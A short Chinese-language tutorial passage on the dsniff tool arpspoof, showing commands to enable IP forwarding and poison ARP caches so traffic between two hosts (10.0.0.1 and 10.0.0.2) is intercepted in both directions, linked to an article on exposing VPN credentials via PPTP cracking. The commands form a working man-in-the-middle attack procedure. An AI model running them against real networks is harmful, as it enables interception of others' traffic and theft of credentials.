---

```console 
shell> dpkg -L dsniff
shell> arpspoof
```

在使用`arpspoof`之前，為了避免封包沒有轉發，建議先開啟封包轉發功能： 

```console 
echo 1 > /proc/sys/net/ipv4/ip_forward
```

要攔截10.0.0.1送往10.0.0.2的封包，可以執行以下的指令： 

```console 
shell> arpspoof -i eth0 -t 10.0.0.1 10.0.0.2
```

可以這樣解釋，把從10.0.0.1往10.0.0.2送的封包都加以攔截（告訴10.0.0.1我就是10.0.0.2），其中-i選項指的是所使用的網路卡，此例為eth0，請自行代換。 

同樣地，要攔截10.0.0.2送往10.0.0.1的封包，則使用下列的指令： 

```console 
shell> arpspoof -i eth0 -t 10.0.0.2 10.0.0.1
```

`arpspoof`在新的版本中有提供-r這個選項，可同時取得兩個方向的封包，包括10.0.0.1 to 10.0.0.2及10.0.0.2 to 10.0.0.1，所以使用一行指令就能取代上述的兩行指令。 


---

- [驗證駭客破解PPTP手法 驚見VPN帳密全都露](http://www.netadmin.com.tw/article_content.aspx?sn=1601040003)